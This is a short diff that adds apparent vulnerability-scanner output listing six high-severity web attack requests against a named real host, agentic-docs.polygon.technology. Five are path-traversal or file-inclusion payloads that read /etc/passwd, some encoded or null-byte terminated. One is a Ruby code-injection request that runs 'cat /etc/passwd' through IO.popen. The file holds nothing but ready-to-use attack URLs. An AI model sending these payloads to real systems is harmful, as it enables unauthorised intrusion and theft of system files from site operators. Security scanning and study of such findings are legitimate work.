@@ -1,0 +1,6 @@
+[wp-vault-local-file-inclusion] [http] [high] https://agentic-docs.polygon.technology/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+[CVE-2021-39316] [http] [high] https://agentic-docs.polygon.technology/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd
+[CVE-2019-7254] [http] [high] https://agentic-docs.polygon.technology/?c=../../../../../../etc/passwd%00
+[CVE-2025-13339] [http] [high] https://agentic-docs.polygon.technology/?hippoo_serve=../../../../../../../etc/passwd
+[CVE-2020-8163] [http] [high] https://agentic-docs.polygon.technology?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+[CVE-2021-32820] [http] [high] https://agentic-docs.polygon.technology/?layout=/etc/passwd
